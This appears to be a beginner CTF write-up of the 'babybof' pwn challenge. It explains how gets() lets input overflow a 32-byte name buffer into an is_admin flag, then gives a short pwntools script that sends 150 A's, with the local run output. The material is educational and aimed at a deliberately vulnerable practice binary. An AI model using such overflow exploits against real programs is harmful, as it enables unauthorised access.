
So this is a really easy introduction to pwn challenge, lets wget it and unzip it.

<pre lang="md">$ wget https://ctf.mcpt.ca/media/problem/mXcRUMoBm9VNveWdDtaUYE1jrkkKZyRjNzNvBUhoJrQ/babybof.zip && unzip babybof.zip </pre>

Next lets run it and see what happens. 

`$ ./chall`


```
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Welcome to the basics of binary exploitation!
For this challenge, you'll learn about buffer overflows!

Here we see our source code takes in an input, and gives you the flag if
is_admin is true. But is_admin is set to false by default, so there is no
way to change that right? Well, welcome to binary exploitation! The first
you will learn in your journey is a buffer overflow.

The first thing you will need to know is how variable are stored. In this
case, the variable is_admin and name are stored one after another. It looks
like this
           +----+--------+
Variables: |name|is_admin|
           +----+--------+
Press enter to continue...
 
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
These variables take different sizes, any existing programming knowledge
tell you an int is 4 bytes, a char is 1 byte and an array takes up
multiple bytes.

Here, we see is_admin takes up 4 bytes and name takes up 1*0x20=32 bytes
(1 is the size of char). We will represent it like so
Variables:
+--------------------------------+--------+
|name                            |is_admin|
+--------------------------------+----+---+
|????????????????????????????????|0000|
+--------------------------------+----+

Here, each digit represents one byte, ? is unknown data, and 0000 is the
current value of is_admin (Note this representation is not completely
accurate but will suffice for this challenge).
Press enter to continue...

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
If I were to enter "Joshua" when it asked for input, it will look
something like this internallyVariables:
+--------------------------------+--------+
|name                            |is_admin|
+--------------------------------+----+---+
|Joshua??????????????????????????|0000|
+--------------------------------+----+

Here, my input fills up the first 6 characters, leaving the rest unfilled
Press enter to continue...

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Knowing this, if we were to compile this, either by typing `make` or 
`gcc -no-pie -fno-stack-protector babybof.c -o babybof`
We get a warning,
+-------------------------------------------------------------------+
| warning: the `gets' function is dangerous and should not be used. |
+-------------------------------------------------------------------+

Why is it dangerous? It only takes input! How bad can that be?
The reason why gets is dangerous is because there is no limit to how much
you can input. You can send a 1000 character input and gets will happily
take the input and store it for you.
Going back to our internal representation of our variables, we see what
we typed in is placed into name. The size of name allows us to store 32 bytes
or 32 characters. But what happens if we store more than 32 characters into
name? Well, there is nothing preventing you from writing into is_admin.
This is our buffer overflow! We are able to write past (overflow) the space
`name` (our buffer) is sized for.

Finally, if we write more than 32 characters, say 100 As, we see the following
Variables:
+--------------------------------+--------+--+
|name                            |is_admin|  |
+--------------------------------+----+---+--+
|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|AAAA|AAA...|
+--------------------------------+----+------+

We overwrote is_admin WITH As. Since is_admin is not 0 anymore, it passes
the if statement and we will get our flag!

Are you ready to try it on your own?
Press enter to continue...

What is your name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
You're not the admin!
(coolenv) h4z3@parrot ~/home/ctf/pwn/babybof/babybof $ ./chall
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Welcome to the basics of binary exploitation!
For this challenge, you'll learn about buffer overflows!

Here we see our source code takes in an input, and gives you the flag if
is_admin is true. But is_admin is set to false by default, so there is no
way to change that right? Well, welcome to binary exploitation! The first
you will learn in your journey is a buffer overflow.

The first thing you will need to know is how variable are stored. In this
case, the variable is_admin and name are stored one after another. It looks
like this
           +----+--------+
Variables: |name|is_admin|
           +----+--------+
Press enter to continue...

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
These variables take different sizes, any existing programming knowledge
tell you an int is 4 bytes, a char is 1 byte and an array takes up
multiple bytes.

Here, we see is_admin takes up 4 bytes and name takes up 1*0x20=32 bytes
(1 is the size of char). We will represent it like so
Variables:
+--------------------------------+--------+
|name                            |is_admin|
+--------------------------------+----+---+
|????????????????????????????????|0000|
+--------------------------------+----+

Here, each digit represents one byte, ? is unknown data, and 0000 is the
current value of is_admin (Note this representation is not completely
accurate but will suffice for this challenge).
Press enter to continue...

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
If I were to enter "Joshua" when it asked for input, it will look
something like this internallyVariables:
+--------------------------------+--------+
|name                            |is_admin|
+--------------------------------+----+---+
|Joshua??????????????????????????|0000|
+--------------------------------+----+

Here, my input fills up the first 6 characters, leaving the rest unfilled
Press enter to continue...

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
Knowing this, if we were to compile this, either by typing `make` or 
`gcc -no-pie -fno-stack-protector babybof.c -o babybof`
We get a warning,
+-------------------------------------------------------------------+
| warning: the `gets' function is dangerous and should not be used. |
+-------------------------------------------------------------------+

Why is it dangerous? It only takes input! How bad can that be?
The reason why gets is dangerous is because there is no limit to how much
you can input. You can send a 1000 character input and gets will happily
take the input and store it for you.
Going back to our internal representation of our variables, we see what
we typed in is placed into name. The size of name allows us to store 32 bytes
or 32 characters. But what happens if we store more than 32 characters into
name? Well, there is nothing preventing you from writing into is_admin.
This is our buffer overflow! We are able to write past (overflow) the space
`name` (our buffer) is sized for.

Finally, if we write more than 32 characters, say 100 As, we see the following
Variables:
+--------------------------------+--------+--+
|name                            |is_admin|  |
+--------------------------------+----+---+--+
|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|AAAA|AAA...|
+--------------------------------+----+------+

We overwrote is_admin WITH As. Since is_admin is not 0 anymore, it passes
the if statement and we will get our flag!

Are you ready to try it on your own?
Press enter to continue...

What is your name?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hi admin, here is your flag
Segmentation fault
```




So we clearly get a huge amout of text and all of it is explaining how this type of buffer overflow exploit works - eg we are overwriting the variable `is_admin` as the program is using the unsafe gets function. So I solved it already by simply pasting a lot of A's, but I will write an exploit script anyway.

```python
from pwn import *
import time

elf = context.binary = ELF('./chall')
p = process()

#automate pressing enter 4 times, add tiny delay so the program doesnt crash
for i in range(4):
	p.sendline('')
	time.sleep(.01)
	
	
p.recvuntil('What is your name?')

#make the payload with 150 A's
payload = b'A' * 150

#send the payload
p.sendline(payload)
p.interactive()
```


So that's it, here's what happens when we run the exploit - 



```shell 
(coolenv) h4z3@parrot ~/home/ctf/pwn/babybof/babybof $ /home/h4z3/coolenv/bin/python /home/h4z3/home/ctf/pwn/babybof/babybof/exploit.py
[*] '/home/h4z3/home/ctf/pwn/babybof/babybof/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[+] Starting local process '/home/h4z3/home/ctf/pwn/babybof/babybof/chall': pid 7960
/home/h4z3/home/ctf/pwn/babybof/babybof/exploit.py:10: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline('')
/home/h4z3/home/ctf/pwn/babybof/babybof/exploit.py:13: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil('What is your name?')
[*] Switching to interactive mode

Hi admin, here is your flag
[*] Got EOF while reading in interactive
$  
```



Note that there's no flag because remote is currently down so I can only solve locally. But anyway we got the flag message so ill take it as a win.
